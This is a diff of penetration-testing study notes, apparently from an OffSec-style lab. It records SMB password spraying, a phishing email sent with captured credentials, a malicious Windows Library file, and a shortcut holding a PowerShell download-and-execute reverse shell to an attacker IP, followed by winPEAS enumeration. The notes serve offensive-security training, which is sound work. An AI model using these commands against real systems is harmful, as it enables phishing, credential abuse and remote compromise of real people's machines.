@@ -723,12 +723,201 @@ cat pws.txt
 
 - Attempt cred cracking SMB
 ```bash
-crackmapexec smb 192.168.216.242 -u unames.txt -p pws.txt --continue-on-success
+nxc smb 192.168.216.242 -u unames.txt -p pws.txt --continue-on-success
 	SMB         192.168.216.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
 	... 
 	SMB         192.168.216.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
 ```
 	- Gives us the domain -> beyond.com
 	- creds we got for john work
+		- Not admin as there's no 'Pwn3d!'
 
-- 
+- Attempt to further enumerate SMB
+```bash
+nxc smb 192.168.174.242 -u john -p dqsTwTpZPn#nL --shares             
+	SMB         192.168.174.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)                                                                                                                         
+	SMB         192.168.174.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
+	SMB         192.168.174.242 445    MAILSRV1         [*] Enumerated shares
+	SMB         192.168.174.242 445    MAILSRV1         Share           Permissions     Remark
+	SMB         192.168.174.242 445    MAILSRV1         -----           -----------     ------
+	SMB         192.168.174.242 445    MAILSRV1         ADMIN$                          Remote Admin
+	SMB         192.168.174.242 445    MAILSRV1         C$                              Default share
+	SMB         192.168.174.242 445    MAILSRV1         IPC$            READ            Remote IPC
+```
+	- Only default shares found
+	- No actionable perms found
+
+
+As there's currently no way to abuse anything, we can try to phish all the employees.
+
+#### Phishing
+
+As we've no idea about their internal structure or installed apps, we'll avoid crafting a malicious Microsoft Office doc.
+Instead, we'll utilize [Windows Library files](11.3%20-%20Win%20Library%20Files.md) in combo w/ shortcut files
+
+- Setup WebDAV share
+```bash
+pip3 install wsgidav
+
+mkdir ~/beyond/webdav
+~/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/beyond/webdav/
+	Running without configuration file.
+	17:26:14.107 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+	17:26:14.108 - INFO    : WsgiDAV/4.3.3 Python/3.11.9 Linux-6.8.11-amd64-x86_64-with-glibc2.38
+	17:26:14.108 - INFO    : Lock manager:      LockManager(LockStorageDict)
+	17:26:14.108 - INFO    : Property manager:  None
+	17:26:14.108 - INFO    : Domain controller: SimpleDomainController()
+	17:26:14.108 - INFO    : Registered DAV providers by route:
+	17:26:14.108 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.11/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
+	17:26:14.108 - INFO    :   - '/': FilesystemProvider for path '/home/kali/exercises/beyond/webdav' (Read-Write) (anonymous)
+	17:26:14.108 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+	17:26:14.108 - WARNING : Share '/' will allow anonymous write access.
+	17:26:14.108 - WARNING : Share '/:dir_browser' will allow anonymous write access.
+	17:26:14.148 - INFO    : Running WsgiDAV/4.3.3 Cheroot/10.0.0 Python/3.11.9
+	17:26:14.148 - INFO    : Serving on http://0.0.0.0:80 ...
+```
+
+- Connect to WINPREP via RDP as offsec with a password of lab in order to prepare the Windows Library and shortcut files
+```bash
+xfreerdp /cert-ignore /compression /auto-reconnect /u:offsec /p:lab /v:192.168.174.250 /drive:kali,/home/kali/exercises/beyond/webdav
+```
+
+- Open Visual Studio Code
+- Create a New Text File
+- Save As > **config.Library-ms** on the desktop
+- Use code from previous Client Side Attack and update to the new IP
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.170</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+- Save & transfer file to Kali
+- Create Shortcut file on WINPREP
+	- Rt-click Desktop > New > Shortcut
+	- Set the location
+```powershell
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.170:8000/powercat.ps1'); powercat -c 192.168.45.170 -p 4444 -e powershell"
+```
+	- Save as `install` & transfer to webdav folder on Kali
+
+- Copy powercat to `~/exercises/beyond/exploits`, setup a python web server on 8000, and, in another tab, a listener for 4444
+```bash
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+python3 -m http.server 8000
+
+nc -nlvp 4444
+```
+
+- Craft `body.txt` for email
+```
+Hey!
+I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.
+
+On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
+
+John
+```
+
+
+- Send email via **swaks**
+```bash
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @webdav/config.Library-ms --server 192.168.174.242 --body @exploits/body.txt --header "Subject: Staging Script" --suppress-data -ap 
+	Username: john
+	Password: dqsTwTpZPn#nL
+	=== Trying 192.168.174.242:25...
+	=== Connected to 192.168.174.242.
+	<-  220 MAILSRV1 ESMTP
+	 -> EHLO kali
+	<-  250-MAILSRV1
+	<-  250-SIZE 20480000
+	<-  250-AUTH LOGIN
+	<-  250 HELP
+	 -> AUTH LOGIN
+	<-  334 VXNlcm5hbWU6
+	 -> am9obg==
+	<-  334 UGFzc3dvcmQ6
+	 -> ZHFzVHdUcFpQbiNuTA==
+	<-  235 authenticated.
+	 -> MAIL FROM:<john@beyond.com>
+	<-  250 OK
+	 -> RCPT TO:<marcus@beyond.com>
+	<-  250 OK
+	 -> DATA
+	<-  354 OK, send.
+	 -> 42 lines sent
+	<-  250 Queued (1.031 seconds)
+	 -> QUIT
+	<-  221 goodbye
+	=== Connection closed with remote host.
+```
+	- -t - Recipient
+	- --from - Sender
+	- --attach - Windows Library file as an attachment
+	- --suppress-data - Summarize the SMTP transaction info
+	- --header - Subject line
+	- --body - Crafted body.txt
+	- --server - IP of MAILSRV1
+	- -ap - Enable pw auth
+
+- After awhile, python and WebDAV server will show requests, and we'll have a reverse shell on CLIENTWK1 via user `marcus`
+```powershell
+whoami
+	beyond\marcus
+
+hostname
+	CLIENTWK1
+
+ipconfig
+	
+	Windows IP Configuration
+	
+	
+	Ethernet adapter Ethernet0:
+	
+	   Connection-specific DNS Suffix  . : 
+	   IPv4 Address. . . . . . . . . . . : 172.16.130.243
+	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+	   Default Gateway . . . . . . . . . : 172.16.130.254
+```
+	- Internal IP range is 172.160.130.243/24
+	- Important to document IP & network info
+
+
+# Enumerating Internal
+
+#### Situational Awareness Local enumeration
+
+- Download **winpeas** onto the victim machine
+```bash
+cd C:\users\marcus
+
+iwr -uri http://192.168.45.170/winPEASx64.exe -outfile winpeas.exe
+./winpeas.exe
+```
+
+##### Results:
+
+- Always manually check OS version as lin/winpeas isn't always accurate.
+```powershell
+systeminfo
+	Host Name:                 CLIENTWK1
+	OS Name:                   Microsoft Windows 11 Pro
+	OS Version:                10.0.22000 N/A Build 22000
+```
